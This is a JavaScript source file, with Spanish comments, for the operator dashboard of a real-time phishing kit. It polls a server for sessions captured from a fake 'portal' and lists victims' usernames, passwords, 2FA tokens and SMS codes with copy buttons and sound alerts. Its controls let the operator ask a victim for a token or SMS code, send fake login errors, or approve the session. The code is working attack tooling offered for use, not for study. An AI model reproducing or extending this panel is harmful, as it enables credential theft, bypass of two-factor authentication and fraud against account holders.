document.addEventListener("DOMContentLoaded", () => {
  // Estado local
  let soundEnabled = true;
  let currentFilter = "all";
  let activeErrorSessionId = null;
  let knownSessions = new Map(); // Guardar copia de sesiones anteriores para detectar cambios

  // Elementos DOM
  const sessionsList = document.getElementById("sessions-list");
  const liveClock = document.getElementById("live-clock");
  const soundToggleBtn = document.getElementById("btn-sound-toggle");
  const soundIcon = document.getElementById("sound-icon");
  const soundText = document.getElementById("sound-text");
  const clearAllBtn = document.getElementById("btn-clear-all");
  const searchInput = document.getElementById("search-input");
  const filterBtns = document.querySelectorAll(".pill-btn");

  // Métricas
  const statTotal = document.getElementById("stat-total");
  const statOnline = document.getElementById("stat-online");
  const statPasswords = document.getElementById("stat-passwords");
  const statTokens = document.getElementById("stat-tokens");
  const statSms = document.getElementById("stat-sms");

  // Modal Error
  const modalError = document.getElementById("modal-custom-error");
  const presetErrorSelect = document.getElementById("preset-error-select");
  const customErrorText = document.getElementById("custom-error-text");
  const btnCancelError = document.getElementById("btn-cancel-error");
  const btnSendErrorConfirm = document.getElementById("btn-send-error-confirm");

  // 1. Reloj en Vivo
  function updateClock() {
    const now = new Date();
    liveClock.textContent = now.toLocaleTimeString();
  }
  setInterval(updateClock, 1000);
  updateClock();

  // 2. Alerta Sonora Web Audio API (Sintetizador sin dependencias externas)
  function playAlertSound(type = 'new') {
    if (!soundEnabled) return;
    try {
      const AudioCtx = window.AudioContext || window.webkitAudioContext;
      if (!AudioCtx) return;
      const ctx = new AudioCtx();
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();

      osc.connect(gain);
      gain.connect(ctx.destination);

      if (type === 'new') {
        // Tono doble de alerta cuando llega nuevo usuario o contraseña
        osc.type = 'sine';
        osc.frequency.setValueAtTime(880, ctx.currentTime); // A5
        osc.frequency.setValueAtTime(1174.66, ctx.currentTime + 0.1); // D6
        gain.gain.setValueAtTime(0.15, ctx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.35);
        osc.start(ctx.currentTime);
        osc.stop(ctx.currentTime + 0.35);
      } else if (type === 'token') {
        // Tono triple de atención cuando llega un Token o SMS
        osc.type = 'triangle';
        osc.frequency.setValueAtTime(523.25, ctx.currentTime); // C5
        osc.frequency.setValueAtTime(659.25, ctx.currentTime + 0.1); // E5
        osc.frequency.setValueAtTime(783.99, ctx.currentTime + 0.2); // G5
        gain.gain.setValueAtTime(0.2, ctx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.45);
        osc.start(ctx.currentTime);
        osc.stop(ctx.currentTime + 0.45);
      }
    } catch (e) {
      console.warn("Audio Context alert failed:", e);
    }
  }

  // Toggle Sonido
  soundToggleBtn.addEventListener("click", () => {
    soundEnabled = !soundEnabled;
    if (soundEnabled) {
      soundToggleBtn.classList.add("sound-on");
      soundIcon.textContent = "🔊";
      soundText.textContent = "Sonido Activo";
      playAlertSound('new');
    } else {
      soundToggleBtn.classList.remove("sound-on");
      soundIcon.textContent = "🔇";
      soundText.textContent = "Sonido Silenciado";
    }
  });

  // Copia de texto con indicador visual
  function copyToClipboard(text, element) {
    if (!text) return;
    navigator.clipboard.writeText(text).then(() => {
      const origText = element.textContent;
      element.textContent = "¡Copiado!";
      element.style.color = "#10b981";
      setTimeout(() => {
        element.textContent = origText;
        element.style.color = "";
      }, 1200);
    });
  }

  // 3. Renderizado de tabla de sesiones
  function renderSessions(sessions) {
    // Filtrar según la búsqueda y botones de filtro
    const query = searchInput.value.toLowerCase().trim();
    const filtered = sessions.filter(s => {
      const matchesSearch = s.username.toLowerCase().includes(query) ||
                            s.ip.toLowerCase().includes(query) ||
                            s.id.toLowerCase().includes(query);
      if (!matchesSearch) return false;

      if (currentFilter === "pass") return !!s.password;
      if (currentFilter === "token") return !!s.token;
      if (currentFilter === "sms") return !!s.smsCode;
      return true;
    });

    // Actualizar métricas
    statTotal.textContent = sessions.length;
    statOnline.textContent = sessions.filter(s => s.status !== 'COMPLETED').length;
    statPasswords.textContent = sessions.filter(s => !!s.password).length;
    statTokens.textContent = sessions.filter(s => !!s.token).length;
    statSms.textContent = sessions.filter(s => !!s.smsCode).length;

    if (filtered.length === 0) {
      sessionsList.innerHTML = `
        <tr class="empty-row">
          <td colspan="8">
            <div class="empty-state">
              <span class="empty-icon">📡</span>
              <p>No hay datos capturados ${query ? 'que coincidan con la búsqueda' : 'aún'}.</p>
              <small>El panel actualizará automáticamente cuando un cliente ingrese al portal.</small>
            </div>
          </td>
        </tr>`;
      return;
    }

    sessionsList.innerHTML = filtered.map(s => {
      // Estado badge
      let statusBadge = `<span class="badge-status badge-submitted"><span class="pulse-dot"></span> EN VIVO</span>`;
      if (s.requestedStep === 'REQUEST_TOKEN') {
        statusBadge = `<span class="badge-status badge-waiting-token">⏳ PIDIENDO TOKEN</span>`;
      } else if (s.requestedStep === 'REQUEST_SMS') {
        statusBadge = `<span class="badge-status badge-waiting-sms">⏳ PIDIENDO SMS</span>`;
      } else if (s.status === 'SUBMITTED_TOKEN') {
        statusBadge = `<span class="badge-status badge-waiting-token">🛡️ TOKEN RECIBIDO</span>`;
      } else if (s.status === 'SUBMITTED_SMS') {
        statusBadge = `<span class="badge-status badge-waiting-sms">📱 SMS RECIBIDO</span>`;
      } else if (s.status === 'ERROR_CREDS') {
        statusBadge = `<span class="badge-status badge-error">❌ ERROR ENVIADO</span>`;
      } else if (s.status === 'COMPLETED') {
        statusBadge = `<span class="badge-status badge-completed">✅ COMPLETADO</span>`;
      }

      // Password display (oculto / visible)
      const passDisplay = s.password ? `
        <div class="copy-val-box">
          <span class="pass-mask" id="pass-val-${s.id}">••••••••</span>
          <span class="btn-copy-icon toggle-eye" data-target="pass-val-${s.id}" data-real="${escapeHtml(s.password)}">👁️</span>
          <span class="btn-copy-icon copy-btn" data-copy="${escapeHtml(s.password)}">📋</span>
        </div>` : '<span class="text-muted">-</span>';

      // Token display
      const tokenDisplay = s.token ? `
        <div class="copy-val-box val-highlight">
          <span>${escapeHtml(s.token)}</span>
          <span class="btn-copy-icon copy-btn" data-copy="${escapeHtml(s.token)}">📋</span>
        </div>` : '<span class="text-muted">-</span>';

      // SMS display
      const smsDisplay = s.smsCode ? `
        <div class="copy-val-box val-sms">
          <span>${escapeHtml(s.smsCode)}</span>
          <span class="btn-copy-icon copy-btn" data-copy="${escapeHtml(s.smsCode)}">📋</span>
        </div>` : '<span class="text-muted">-</span>';

      const timeFormatted = new Date(s.updatedAt).toLocaleTimeString();

      return `
        <tr data-session-id="${s.id}">
          <td>${statusBadge}</td>
          <td>
            <div style="font-weight:700;font-size:12px;" class="font-mono">${s.id}</div>
            <div style="font-size:11px;color:var(--text-muted);">${s.ip}</div>
          </td>
          <td>
            <div class="copy-val-box">
              <span style="color:#ffffff;">${escapeHtml(s.username)}</span>
              <span class="btn-copy-icon copy-btn" data-copy="${escapeHtml(s.username)}">📋</span>
            </div>
          </td>
          <td>${passDisplay}</td>
          <td>${tokenDisplay}</td>
          <td>${smsDisplay}</td>
          <td style="font-size:12px;color:var(--text-muted);">${timeFormatted}</td>
          <td class="text-center">
            <div class="action-btns-group">
              <button class="act-btn act-btn-token btn-action-trigger" data-id="${s.id}" data-action="request_token" title="Pedir Clave Token">
                🔑 Token
              </button>
              <button class="act-btn act-btn-sms btn-action-trigger" data-id="${s.id}" data-action="request_sms" title="Pedir Código SMS">
                💬 SMS
              </button>
              <button class="act-btn act-btn-error btn-open-error-modal" data-id="${s.id}" title="Rechazar Credenciales / Enviar Error">
                ❌ Error
              </button>
              <button class="act-btn act-btn-approve btn-action-trigger" data-id="${s.id}" data-action="approve" title="Aprobar e Ingresar">
                ✅ Ok
              </button>
              <button class="act-btn act-btn-delete btn-action-trigger" data-id="${s.id}" data-action="delete" title="Eliminar registro">
                🗑️
              </button>
            </div>
          </td>
        </tr>
      `;
    }).join("");

    // Event listeners para copiar y toggle password
    document.querySelectorAll(".copy-btn").forEach(btn => {
      btn.addEventListener("click", (e) => {
        const text = e.target.getAttribute("data-copy");
        copyToClipboard(text, e.target);
      });
    });

    document.querySelectorAll(".toggle-eye").forEach(btn => {
      btn.addEventListener("click", (e) => {
        const targetId = e.target.getAttribute("data-target");
        const realVal = e.target.getAttribute("data-real");
        const span = document.getElementById(targetId);
        if (span) {
          if (span.textContent === "••••••••") {
            span.textContent = realVal;
            e.target.textContent = "🙈";
          } else {
            span.textContent = "••••••••";
            e.target.textContent = "👁️";
          }
        }
      });
    });

    // Listener para acciones de operador
    document.querySelectorAll(".btn-action-trigger").forEach(btn => {
      btn.addEventListener("click", (e) => {
        const target = e.target.closest(".btn-action-trigger");
        const id = target.getAttribute("data-id");
        const action = target.getAttribute("data-action");
        if (action === 'delete') {
          deleteSession(id);
        } else {
          executeAdminAction(id, action);
        }
      });
    });

    document.querySelectorAll(".btn-open-error-modal").forEach(btn => {
      btn.addEventListener("click", (e) => {
        const target = e.target.closest(".btn-open-error-modal");
        activeErrorSessionId = target.getAttribute("data-id");
        modalError.classList.add("show-modal");
      });
    });
  }

  // Escape HTML helper
  function escapeHtml(str) {
    if (!str) return '';
    return String(str)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;');
  }

  // 4. Obtención de Sesiones en tiempo real (Polling cada 1 segundo)
  async function fetchSessions() {
    try {
      const res = await fetch("/api/admin/sessions");
      const data = await res.json();
      if (data.success && Array.isArray(data.sessions)) {
        // Detectar si hay nuevas sesiones o nuevos tokens/SMS
        data.sessions.forEach(sess => {
          const prev = knownSessions.get(sess.id);
          if (!prev) {
            playAlertSound('new');
          } else {
            if ((!prev.token && sess.token) || (!prev.smsCode && sess.smsCode)) {
              playAlertSound('token');
            }
          }
          knownSessions.set(sess.id, sess);
        });

        renderSessions(data.sessions);
      }
    } catch (err) {
      console.error("Error al obtener sesiones:", err);
    }
  }

  // 5. Ejecutar Acción en Servidor
  async function executeAdminAction(sessionId, action, customError = null) {
    try {
      const res = await fetch("/api/admin/action", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ sessionId, action, customError })
      });
      const data = await res.json();
      if (data.success) {
        fetchSessions();
      }
    } catch (err) {
      console.error("Error al ejecutar acción de operador:", err);
    }
  }

  // 6. Eliminar sesión
  async function deleteSession(sessionId) {
    if (!confirm("¿Desea eliminar este registro de sesión?")) return;
    try {
      const res = await fetch(`/api/admin/sessions/${sessionId}`, {
        method: "DELETE"
      });
      const data = await res.json();
      if (data.success) {
        knownSessions.delete(sessionId);
        fetchSessions();
      }
    } catch (err) {
      console.error("Error al eliminar sesión:", err);
    }
  }

  // 7. Limpiar todas las sesiones
  clearAllBtn.addEventListener("click", async () => {
    if (!confirm("¿ESTÁ SEGURO de eliminar TODAS las sesiones capturadas?")) return;
    try {
      const res = await fetch("/api/admin/clear", { method: "POST" });
      const data = await res.json();
      if (data.success) {
        knownSessions.clear();
        fetchSessions();
      }
    } catch (err) {
      console.error("Error al limpiar sesiones:", err);
    }
  });

  // Modal Error Handlers
  presetErrorSelect.addEventListener("change", () => {
    if (presetErrorSelect.value === "custom") {
      customErrorText.classList.remove("hidden");
    } else {
      customErrorText.classList.add("hidden");
    }
  });

  btnCancelError.addEventListener("click", () => {
    modalError.classList.remove("show-modal");
    activeErrorSessionId = null;
  });

  btnSendErrorConfirm.addEventListener("click", () => {
    if (!activeErrorSessionId) return;
    let errorMsg = presetErrorSelect.value;
    if (errorMsg === "custom") {
      errorMsg = customErrorText.value.trim() || "Nombre de usuario o contraseña incorrectos.";
    }
    executeAdminAction(activeErrorSessionId, "reject_creds", errorMsg);
    modalError.classList.remove("show-modal");
    activeErrorSessionId = null;
  });

  // Filtros y búsqueda
  searchInput.addEventListener("input", () => {
    fetchSessions();
  });

  filterBtns.forEach(btn => {
    btn.addEventListener("click", (e) => {
      filterBtns.forEach(b => b.classList.remove("active"));
      e.target.classList.add("active");
      currentFilter = e.target.getAttribute("data-filter");
      fetchSessions();
    });
  });

  // Iniciar Polling continuo a 1000ms
  setInterval(fetchSessions, 1000);
  fetchSessions();
});
